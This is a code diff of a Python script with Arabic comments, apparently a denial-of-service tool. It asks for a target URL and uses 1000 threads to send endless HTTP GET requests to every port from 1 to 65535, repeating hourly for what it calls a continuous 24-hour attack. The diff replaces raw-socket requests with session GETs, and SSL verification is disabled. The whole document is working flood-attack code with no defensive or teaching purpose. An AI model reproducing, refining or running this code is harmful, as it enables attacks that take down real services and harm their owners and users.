@@ -3,7 +3,6 @@ import threading
 import urllib3
 import time
 from concurrent.futures import ThreadPoolExecutor
-import socket
 
 # تعطيل التحقق من صحة شهادة SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -22,27 +21,23 @@ session.verify = False
 bytes_transferred = 0
 lock = threading.Lock()
 
-def attack(ip, port):
+def attack(url):
     global bytes_transferred
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            message = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
-            sock.send(message)
-            response = sock.recv(4096)
+            response = session.get(url, headers=headers)
             with lock:
-                bytes_transferred += len(response)
-            print(f"تم إرسال الطلب إلى: {ip}:{port}")
-            sock.close()
+                bytes_transferred += len(response.content)
+            print("تم إرسال الطلب إلى:", url)
         except Exception as e:
-            print(f"حدث خطأ على {ip}:{port}:", e)
+            print("حدث خطأ:", e)
 
-def start_attack(ip):
+def start_attack(base_url):
     ports = list(range(1, 65536))  # جميع المنافذ الممكنة من 1 إلى 65535
     with ThreadPoolExecutor(max_workers=1000) as executor:
         for port in ports:
-            executor.submit(attack, ip, port)
+            url = f"{base_url}:{port}"
+            executor.submit(attack, url)
 
 def calculate_speed():
     global bytes_transferred
@@ -54,7 +49,8 @@ def calculate_speed():
         print(f"سرعة النقل: {speed:.2f} MB/s")
 
 url = input("أدخل رابط الهدف: ")
-ip = socket.gethostbyname(url.split('//')[-1].split('/')[0])
+base_url = url.split('//')[-1].split('/')[0]
+base_url = f"http://{base_url}"
 
 print("بدء الهجوم بشكل مستمر على مدار 24 ساعة")
 
@@ -64,5 +60,5 @@ speed_thread.daemon = True
 speed_thread.start()
 
 while True:
-    start_attack(ip)
+    start_attack(base_url)
     time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
